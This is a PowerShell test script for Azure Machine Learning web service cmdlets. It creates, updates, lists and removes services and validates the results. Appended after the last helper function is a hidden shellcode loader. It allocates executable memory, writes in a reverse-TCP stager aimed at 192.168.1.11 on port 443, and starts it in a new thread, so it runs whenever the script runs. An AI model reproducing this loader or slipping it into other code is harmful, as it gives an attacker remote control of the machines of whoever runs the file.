













 
 
 
 
 
$WEBSERVICE_DEFINITION_FILE_PROD = 'TestData\GraphWebServiceDefinition_Prod.json'
$WEBSERVICE_DEFINITION_FILE_DOGFOOD = 'TestData\GraphWebServiceDefinition_Dogfoood.json'
$TEST_WEBSERVICE_DEFINITION_FILE = $WEBSERVICE_DEFINITION_FILE_PROD


function Test-CreateGetRemoveMLService
{  
    $serviceDeleted = $false

    $actualTest = {
        param([string] $rgName, [string] $location, [string] $webServiceName, `
                [string] $commitmentPlanId, [object] $storageAccount)
        try 
        {
            
            $svcDefinition = LoadWebServiceDefinitionForTest `
                                $TEST_WEBSERVICE_DEFINITION_FILE $commitmentPlanId $storageAccount
            LogOutput "Creating web service: $webServiceName"
            $svc = $svcDefinition | New-AzMlWebService `
                    -ResourceGroupName $rgName -Location $location -Name $webServiceName -Force
            Assert-NotNull $svc
            LogOutput "Created web service: $($svc.Id)"                     
            ValidateWebServiceResult $rgName $webServiceName $location $svc

            
            $keys = Get-AzMlWebServiceKeys -ResourceGroupName $rgName -Name $webServiceName
            LogOutput "Checking that the service's keys are not null."
            Assert-NotNull $keys
            $expectedPrimaryKey = $svcDefinition.Properties.Keys.Primary        
            $expectedSecondaryKey = $svcDefinition.Properties.Keys.Secondary
            LogOutput "Checking that the primary key value $($keys.Primary) is `
                            equal to the expected value $expectedPrimaryKey"
            Assert-True { [System.String]::Equals($keys.Primary, $expectedPrimaryKey, `
                                                    [System.StringComparison]::OrdinalIgnoreCase) }
            LogOutput "Checking that the secondary key value $($keys.Primary) is `
                            equal to the expected value $expectedSecondaryKey"
            Assert-True { [System.String]::Equals($keys.Secondary, $expectedSecondaryKey, `
                                                    [System.StringComparison]::OrdinalIgnoreCase) }

            
            LogOutput "Removing web service $webServiceName from resource group $rgName"
            $svc | Remove-AzMlWebService -Force
            LogOutput "Web service $webServiceName was removed."    
            $serviceDeleted = $true

            
            Assert-ThrowsContains { Get-AzMlWebService -ResourceGroupName $rgName `
                                        -Name $webServiceName } "WebServiceNotFound"
        }
        finally
        {
            
            if (!$serviceDeleted) 
            {                   
                Clean-WebService $rgName $webServiceName             
            }       
        }
    };

    RunWebServicesTest $actualTest
}


function Test-CreateWebServiceFromFile
{
    $actualTest = {
        param([string] $rgName, [string] $location, [string] $webServiceName, `
                [string] $commitmentPlanId, [object] $storageAccount)

        $definitionFile = "";
        try 
        {
            
            $svcDefinition = LoadWebServiceDefinitionForTest $TEST_WEBSERVICE_DEFINITION_FILE `
                                                             $commitmentPlanId $storageAccount
            $definitionFile = "$webServiceName.json"
            LogOutput "Exporting web service definition to file: $definitionFile"
            Export-AzMlWebService -WebService $svcDefinition -OutputFile $definitionFile
            LogOutput "Checking that exported service definition exists at $definitionFile"
            Assert-True { Test-Path $definitionFile }

            
            LogOutput "Creating web service: $webServiceName"
            $svc = New-AzMlWebService -ResourceGroupName $rgName -Location $location `
                                        -Name $webServiceName -DefinitionFile $definitionFile `
                                        -Force
            LogOutput "Created web service: $webServiceName"
            ValidateWebServiceResult $rgName $webServiceName $location $svc
        }
        finally
        {
            if (Test-Path $definitionFile)
            {
                Remove-Item $definitionFile
            }
            
            Clean-WebService $rgName $webServiceName            
        }
    };

    RunWebServicesTest $actualTest
}


function Test-UpdateWebService
{
    $actualTest = {
        param([string] $rgName, [string] $location, [string] $webServiceName, `
                [string] $commitmentPlanId, [object] $storageAccount)        
        try 
        {
            
            $svcDefinition = LoadWebServiceDefinitionForTest $TEST_WEBSERVICE_DEFINITION_FILE `
                                    $commitmentPlanId $storageAccount
            LogOutput "Creating web service: $webServiceName"
            $svc = New-AzMlWebService -ResourceGroupName $rgName -Location $location `
                                    -Name $webServiceName -NewWebServiceDefinition $svcDefinition `
                                    -Force
            Assert-NotNull $svc
            LogOutput "Created web service: $($svc.Id)"
            ValidateWebServiceResult $rgName $webServiceName $location $svc
            $creationModifiedOn = [datetime]::Parse($svc.Properties.ModifiedOn)
            LogOutput "Web service's last modified time stamp: $creationModifiedOn"

            
            $svcDefinition.Properties.Description = "This has now changed."
            LogOutput "Updating description on service $($svc.Id)"
            $updatedSvc = Update-AzMlWebService -ResourceGroupName $rgName `
                                    -Name $webServiceName -ServiceUpdates $svcDefinition `
                                    -Force
            Assert-NotNull $updatedSvc
            LogOutput "Update has completed."
            $updateModifiedOn = [datetime]::Parse($updatedSvc.Properties.ModifiedOn)
            LogOutput "Web service's last modified time stamp: $updateModifiedOn"
            
            
            ValidateWebServiceResult $rgName $webServiceName $location $updatedSvc
            LogOutput "Checking that the description property has been updated."
            Assert-AreEqual $svcDefinition.Properties.Description $updatedSvc.Properties.Description
            LogOutput "Checking that the ModifiedOn field updated accordingly."
            Assert-True { $creationModifiedOn -lt $updateModifiedOn }

            
            $newPrimaryKey = 'highly secure key'
            LogOutput "Updating in line properties on service $($svc.Id)"
            $updatedSvc2 = Update-AzMlWebService -ResourceGroupName $rgName -Name $webServiceName `
                            -RealtimeConfiguration @{ MaxConcurrentCalls = 30 } `
                            -Keys @{ Primary = $newPrimaryKey } -Force
            Assert-NotNull $updatedSvc2
            LogOutput "Update has completed."
            $update2ModifiedOn = [datetime]::Parse($updatedSvc2.Properties.ModifiedOn)
            LogOutput "Web service's last modified time stamp: $update2ModifiedOn"
            
            
            ValidateWebServiceResult $rgName $webServiceName $location $updatedSvc2
            LogOutput "Checking that the RealtimeConfiguration property has been updated."
            Assert-AreEqual 30 $updatedSvc2.Properties.RealtimeConfiguration.MaxConcurrentCalls
            LogOutput "Checking that the ModifiedOn field updated accordingly."            
            Assert-True { $updateModifiedOn -lt $update2ModifiedOn }
            
            $keys = Get-AzMlWebServiceKeys -ResourceGroupName $rgName -Name $webServiceName
            LogOutput "Checking that the service's keys are not null."
            Assert-NotNull $keys
            LogOutput "Checking that the service's primary key has changed."
            Assert-AreEqual $newPrimaryKey $keys.Primary
            LogOutput "Checking that the service's secondary key has not changed."
            Assert-AreEqual $svcDefinition.Properties.Keys.Secondary $keys.Secondary
        }
        finally
        {            
            Clean-WebService $rgName $webServiceName         
        }
    };

    RunWebServicesTest $actualTest
}


function Test-ListWebServices
{
    $actualTest = {
        param([string] $rgName, [string] $location, [string] $webServiceName, [string] $commitmentPlanId)        
        try 
        {
            $sameGroupWebServiceName = Get-WebServiceName
            $otherResourceGroupName = Get-ResourceGroupName 
            $otherGroupWebServiceName = Get-WebServiceName

            
            $svcDefinition = LoadWebServiceDefinitionForTest $TEST_WEBSERVICE_DEFINITION_FILE `
                                    $commitmentPlanId $storageAccount
            LogOutput "Creating web service 1: $webServiceName"
            $svc1 = New-AzMlWebService -ResourceGroupName $rgName -Location $location `
                                    -Name $webServiceName -NewWebServiceDefinition $svcDefinition `
                                    -Force
            Assert-NotNull $svc1
            LogOutput "Created web service 1: $($svc1.Id)"                     
            ValidateWebServiceResult $rgName $webServiceName $location $svc1
            LogOutput "Creating web service 2: $sameGroupWebServiceName"
            $svc2 = New-AzMlWebService -ResourceGroupName $rgName -Location $location `
                            -Name $sameGroupWebServiceName -NewWebServiceDefinition $svcDefinition `
                            -Force
            Assert-NotNull $svc2
            LogOutput "Created web service 2: $($svc2.Id)"                     
            ValidateWebServiceResult $rgName $sameGroupWebServiceName $location $svc2

            
            LogOutput "Creating resource group: $otherResourceGroupName"    
            $otherGroup = New-AzResourceGroup -Name $otherResourceGroupName -Location $location        
            LogOutput("Created resource group: $($otherGroup.ResourceId)")
            LogOutput "Creating web service: $otherGroupWebServiceName"
            $svc3 = New-AzMlWebService -ResourceGroupName $otherResourceGroupName -Location $location `
                            -Name $otherGroupWebServiceName -NewWebServiceDefinition $svcDefinition -Force
            Assert-NotNull $svc3
            LogOutput "Created web service: $($svc3.Id)"                     
            ValidateWebServiceResult $otherResourceGroupName $otherGroupWebServiceName $location $svc3

            
            LogOutput "Listing all web services in resource group: $rgName"
            $servicesInGroup = Get-AzMlWebService -ResourceGroupName $rgName
            Assert-NotNull $servicesInGroup
            LogOutput "Group $rgName contains $($servicesInGroup.Count) web services."    
            Assert-AreEqual 2 $servicesInGroup.Count
            LogOutput "Checking that service $($svc1.Id) is part of returned list."
            Assert-NotNull ($servicesInGroup | where { $_.Id -eq $svc1.Id })
            LogOutput "Checking that service $($svc2.Id) is part of returned list."
            Assert-NotNull ($servicesInGroup | where { $_.Id -eq $svc2.Id })

            
            LogOutput "Listing all web services in resource group: $otherResourceGroupName"
            $servicesInOtherGroup = Get-AzMlWebService -ResourceGroupName $otherResourceGroupName
            Assert-NotNull $servicesInOtherGroup            
            LogOutput "Group $otherResourceGroupName contains $($servicesInOtherGroup.Count) web services."                            
            Assert-AreEqual 1 $servicesInOtherGroup.Count
            LogOutput "Checking that service $($svc3.Id) is part of returned list."
            Assert-True { $servicesInOtherGroup[0].Id -eq $svc3.Id }

            
            $servicesInSubscription = Get-AzMlWebService
            Assert-NotNull $servicesInSubscription
            LogOutput "Found $($servicesInSubscription.Count) web services in the current subscription."    
            Assert-False { $servicesInSubscription.Count -lt 3 }
            LogOutput "Checking that service $($svc1.Id) is part of returned list."
            Assert-NotNull ($servicesInSubscription | where { $_.Id -eq $svc1.Id })
            LogOutput "Checking that service $($svc2.Id) is part of returned list."
            Assert-NotNull ($servicesInSubscription | where { $_.Id -eq $svc2.Id })
            LogOutput "Checking that service $($svc3.Id) is part of returned list."
            Assert-NotNull ($servicesInSubscription | where { $_.Id -eq $svc3.Id })
        }
        finally
        {                
            Clean-WebService $rgName $webServiceName
            Clean-WebService $rgName $sameGroupWebServiceName
            Clean-WebService $otherResourceGroupName $otherGroupWebServiceName
            Clean-ResourceGroup $otherResourceGroupName 
        }
    };

    RunWebServicesTest $actualTest
}


function Test-CreateAndGetRegionalProperties
{
    $actualTest = {
        param([string] $rgName, [string] $location, [string] $webServiceName, `
                [string] $commitmentPlanId, [object] $storageAccount)

        $definitionFile = "";
        try 
        {
            
            $svcDefinition = LoadWebServiceDefinitionForTest $TEST_WEBSERVICE_DEFINITION_FILE `
                                                             $commitmentPlanId $storageAccount
            $definitionFile = "$webServiceName.json"
            LogOutput "Exporting web service definition to file: $definitionFile"
            Export-AzMlWebService -WebService $svcDefinition -OutputFile $definitionFile
            LogOutput "Checking that exported service definition exists at $definitionFile"
            Assert-True { Test-Path $definitionFile }

            
            LogOutput "Creating web service: $webServiceName"
            $svc = New-AzMlWebService -ResourceGroupName $rgName -Location $location `
                                        -Name $webServiceName -DefinitionFile $definitionFile `
                                        -Force
            LogOutput "Created web service: $webServiceName"
            ValidateWebServiceResult $rgName $webServiceName $location $svc

            $newRegion = "westcentralus"

            
            Assert-ThrowsContains { Get-AzMlWebService -ResourceGroupName $rgName `
                                        -Name $webServiceName -region $newRegion} "PerRegionPayloadNotFound"

            LogOutput "Creating web service regional properties for $webServiceName in $newRegion"
            $newSvc = Add-AzMlWebServiceRegionalProperty -ResourceGroupName $rgName -Name $webServiceName -region $newRegion -Force
            ValidateWebServiceResult $rgName $webServiceName $location $svc
            
            Assert-AreEqual $newSvc.Properties.Package.Nodes["node1"].parameters["Account Key"].certificateThumbprint "ENCRYPTED_CERTIFICATETHUMBPRINT_2"
        }
        finally
        {
            if (Test-Path $definitionFile)
            {
                Remove-Item $definitionFile
            }
            
            Clean-WebService $rgName $webServiceName            
        }
    };

    RunWebServicesTest $actualTest
}


function RunWebServicesTest([ScriptBlock] $testScript)
{
    
    $rgName = Get-ResourceGroupName 
    $location = Get-ProviderLocation "Microsoft.MachineLearning" "webServices"
    $webServiceName = Get-WebServiceName
    $storageAccountName = Get-TestStorageAccountName
    $commitmentPlanName = Get-CommitmentPlanName
    $cpApiVersion = Get-ProviderAPIVersion "Microsoft.MachineLearning" "commitmentPlans"
    LogOutput "Using version $cpApiVersion of the CP RP APIs"

    try
    {
        
        LogOutput "Creating resource group: $rgName"    
        $group = New-AzResourceGroup -Name $rgName -Location $location        
        LogOutput("Created resource group: $($group.ResourceId)")
        LogOutput("Created resource group: $($group.ResourceGroupName)")

        LogOutput "Creating storage account: $storageAccountName"    
        $storageAccount = Create-TestStorageAccount $rgName $location $storageAccountName        
        LogOutput("Created storage account: $storageAccountName")

        LogOutput "Creating commitment plan resource: $commitmentPlanName"
        $cpSku = @{Name = 'S1'; Tier='Standard'; Capacity=1}
        $cpPlan = New-AzResource -Location $location -ResourceType `
                        "Microsoft.MachineLearning/CommitmentPlans" -ResourceName $commitmentPlanName `
                        -ResourceGroupName $rgName -SkuObject $cpSku -Properties @{} `
                        -ApiVersion $cpApiVersion -Force     
        LogOutput "Created commitment plan resource: $($cpPlan.ResourceId)" 

        &$testScript $rgName $location $webServiceName $cpPlan.ResourceId $storageAccount
    }
    finally
    {  
        Clean-TestStorageAccount $rgName $storageAccountName
        Clean-ResourceGroup $rgName        
    }
}

function LoadWebServiceDefinitionForTest([string] $filePath, [string] $commitmentPlanId, [object] $storageAccount)
{
    $svcDefinition = Import-AzMlWebService -InputFile $filePath
    $svcDefinition.Properties.CommitmentPlan.Id = $commitmentPlanId
    $svcDefinition.Properties.StorageAccount.Name = $storageAccount.Name
    $svcDefinition.Properties.StorageAccount.Key = $storageAccount.Key

    return $svcDefinition
}

function ValidateWebServiceResult([string] $rgName, [string] $webServiceName, [string] $location, `
                    [Microsoft.Azure.Management.MachineLearning.WebServices.Models.WebService] $svc)
{
    $subscriptionId = ((Get-AzContext).Subscription).SubscriptionId        
    $expectedServiceResourceId = "/subscriptions/$subscriptionId/resourceGroups/$rgName/providers/Microsoft.MachineLearning/webservices/$webServiceName"
    LogOutput "Checking that the created webservice's resource id $($svc.Id) matches the expected value $expectedServiceResourceId"
    Assert-AreEqual $expectedServiceResourceId $svc.Id
    LogOutput "Checking that the service's location $($svc.Location) is the expected value $location"
    Assert-True { [System.String]::Equals($svc.Location.Replace(" ", ""), $location, [System.StringComparison]::OrdinalIgnoreCase) }
    LogOutput "Checking the service's resource type: $($svc.Type)"
    Assert-AreEqual "Microsoft.MachineLearning/webservices" $svc.Type
    LogOutput "Checking that the service's properties are not null."
    Assert-NotNull $svc.Properties
    LogOutput "Checking that the service's provisioning has succeeded."
    Assert-AreEqual $svc.Properties.ProvisioningState "Succeeded"
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

